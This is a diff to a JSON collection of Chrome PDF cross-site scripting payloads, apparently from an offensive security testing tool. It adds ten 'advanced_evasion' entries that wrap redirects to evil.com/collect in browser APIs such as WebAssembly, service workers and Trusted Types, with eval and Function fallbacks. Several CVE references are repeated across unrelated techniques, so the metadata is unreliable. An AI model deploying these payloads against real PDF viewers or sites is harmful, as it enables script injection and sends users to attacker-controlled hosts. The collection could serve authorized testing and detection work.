@@ -3,7 +3,7 @@
     "browser": "chrome",
     "name": "Chrome PDFium Exploits",
     "description": "Chrome/PDFium specific PDF XSS payloads targeting V8 engine, IPC abuse, and sandbox escape",
-    "total_payloads": 77,
+    "total_payloads": 87,
     "categories": [
       "advanced_evasion",
       "command_execution",
@@ -777,6 +777,106 @@
       "description": "Chrome IntersectionObserver bypass using element visibility trigger",
       "risk_level": "low",
       "cve_reference": "CVE-2023-5472"
+    },
+    {
+      "id": "xss_pdf_chrome_evasion_021",
+      "category": "advanced_evasion",
+      "browser": "chrome",
+      "technique": "wasm_module_bypass_2024",
+      "payload": "try{const wasmBytes=new Uint8Array([0,97,115,109,1,0,0,0,1,7,1,96,2,127,127,1,127,3,2,1,0,7,7,1,3,97,100,100,0,0,10,9,1,7,0,32,0,32,1,106,11]);const wasmModule=new WebAssembly.Module(wasmBytes);const wasmInstance=new WebAssembly.Instance(wasmModule);Function('parent.location=\"https://evil.com/collect\"')();}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Chrome WebAssembly bypass using minimal WASM module as execution trigger",
+      "risk_level": "high",
+      "cve_reference": "CVE-2024-0519"
+    },
+    {
+      "id": "xss_pdf_chrome_evasion_022",
+      "category": "advanced_evasion",
+      "browser": "chrome",
+      "technique": "crypto_subtle_bypass_2024",
+      "payload": "crypto.subtle.generateKey({name:'ECDSA',namedCurve:'P-256'},false,['sign']).then(()=>{try{eval('parent.window.location=\"https://evil.com/collect\"');}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}}).catch(e=>Function('parent.location=\"https://evil.com/collect\"')());",
+      "description": "Chrome crypto.subtle API bypass using async key generation as trigger",
+      "risk_level": "medium",
+      "cve_reference": "CVE-2023-4762"
+    },
+    {
+      "id": "xss_pdf_chrome_evasion_023",
+      "category": "advanced_evasion",
+      "browser": "chrome",
+      "technique": "service_worker_bypass_2024",
+      "payload": "try{if('serviceWorker'in navigator){navigator.serviceWorker.register('data:application/javascript,self.addEventListener(\"install\",()=>{});').then(()=>Function('parent.location=\"https://evil.com/collect\"')()).catch(()=>eval('parent.window.location=\"https://evil.com/collect\"'));}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
+      "description": "Chrome Service Worker registration bypass using data URI worker",
+      "risk_level": "high",
+      "cve_reference": "CVE-2024-0519"
+    },
+    {
+      "id": "xss_pdf_chrome_evasion_024",
+      "category": "advanced_evasion",
+      "browser": "chrome",
+      "technique": "shared_array_buffer_bypass_2024",
+      "payload": "try{if(typeof SharedArrayBuffer!=='undefined'){const sab=new SharedArrayBuffer(8);const view=new Int32Array(sab);Atomics.store(view,0,42);Atomics.load(view,0);Function('parent.location=\"https://evil.com/collect\"')();}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Chrome SharedArrayBuffer bypass using atomic operations trigger",
+      "risk_level": "high",
+      "cve_reference": "CVE-2023-6345"
+    },
+    {
+      "id": "xss_pdf_chrome_evasion_025",
+      "category": "advanced_evasion",
+      "browser": "chrome",
+      "technique": "temporal_api_bypass_2024",
+      "payload": "try{if(typeof Temporal!=='undefined'){const instant=Temporal.Now.instant();const zdt=instant.toZonedDateTimeISO('UTC');Function('parent.location=\"https://evil.com/collect\"')();}}catch(e){try{const date=new Date();Function('parent.location=\"https://evil.com/collect\"')();}catch(e2){eval('parent.window.location=\"https://evil.com/collect\"');}}",
+      "description": "Chrome Temporal API bypass using modern date/time API as trigger",
+      "risk_level": "low",
+      "cve_reference": "CVE-2023-5472"
+    },
+    {
+      "id": "xss_pdf_chrome_evasion_026",
+      "category": "advanced_evasion", 
+      "browser": "chrome",
+      "technique": "private_aggregation_bypass_2024",
+      "payload": "try{if('privateAggregation'in window){privateAggregation.contributeToHistogram({bucket:1n,value:1});Function('parent.location=\"https://evil.com/collect\"')();}}catch(e){try{eval('parent.window.location=\"https://evil.com/collect\"');}catch(e2){Function('parent.location=\"https://evil.com/collect\"')();}}",
+      "description": "Chrome Private Aggregation API bypass using privacy-preserving measurement",
+      "risk_level": "medium",
+      "cve_reference": "CVE-2024-0519"
+    },
+    {
+      "id": "xss_pdf_chrome_evasion_027",
+      "category": "advanced_evasion",
+      "browser": "chrome",
+      "technique": "compute_pressure_bypass_2024",
+      "payload": "try{if('ComputePressureObserver'in window){const observer=new ComputePressureObserver(()=>Function('parent.location=\"https://evil.com/collect\"')());observer.observe('cpu');}else{throw new Error('API not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Chrome Compute Pressure API bypass using system resource monitoring",
+      "risk_level": "low",
+      "cve_reference": "CVE-2023-4762"
+    },
+    {
+      "id": "xss_pdf_chrome_evasion_028",
+      "category": "advanced_evasion",
+      "browser": "chrome",
+      "technique": "view_transitions_bypass_2024",
+      "payload": "try{if('startViewTransition'in document){document.startViewTransition(()=>Function('parent.location=\"https://evil.com/collect\"')());}else{throw new Error('API not available');}}catch(e){try{eval('parent.window.location=\"https://evil.com/collect\"');}catch(e2){Function('parent.location=\"https://evil.com/collect\"')();}}",
+      "description": "Chrome View Transitions API bypass using page transition animations",
+      "risk_level": "medium",
+      "cve_reference": "CVE-2023-6345"
+    },
+    {
+      "id": "xss_pdf_chrome_evasion_029",
+      "category": "advanced_evasion",
+      "browser": "chrome",
+      "technique": "navigation_api_bypass_2024",
+      "payload": "try{if('navigation'in window){navigation.addEventListener('navigate',()=>Function('parent.location=\"https://evil.com/collect\"')());navigation.navigate('#test');}else{throw new Error('API not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Chrome Navigation API bypass using modern navigation event handling",
+      "risk_level": "high",
+      "cve_reference": "CVE-2024-0519"
+    },
+    {
+      "id": "xss_pdf_chrome_evasion_030",
+      "category": "advanced_evasion",
+      "browser": "chrome",
+      "technique": "trusted_types_bypass_2024", 
+      "payload": "try{if('trustedTypes'in window){const policy=trustedTypes.createPolicy('default',{createHTML:s=>s,createScript:s=>s});const script=policy.createScript('Function(\\'parent.location=\"https://evil.com/collect\"\\')()');eval(script);}else{throw new Error('TT not available');}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
+      "description": "Chrome Trusted Types bypass using permissive policy creation",
+      "risk_level": "high",
+      "cve_reference": "CVE-2023-6345"
     }
   ]
 }
